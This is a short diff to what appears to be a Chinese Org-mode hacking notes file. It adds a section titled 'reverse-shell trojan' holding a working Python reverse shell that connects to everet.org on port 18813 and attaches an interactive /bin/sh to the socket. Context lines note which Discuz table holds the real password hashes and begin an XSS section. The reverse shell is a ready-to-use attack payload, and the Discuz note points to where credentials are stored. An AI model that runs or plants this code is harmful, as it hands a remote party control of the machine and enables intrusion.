@@ -16,6 +16,18 @@
 * discuz
   cdb_members里面的password字段存放的是随机数，cdb_uc_members的password存放的才是真正的密码。
 
+* 反弹木马
+  #+BEGIN_SRC python
+    import socket, subprocess, os
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("everet.org", 18813))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    p = subprocess.call(["/bin/sh", "-i"]);
+  #+END_SRC
+
 * xss
   #+BEGIN_EXAMPLE
       Oct   Dec   Hex   Char                        Oct   Dec   Hex   Char
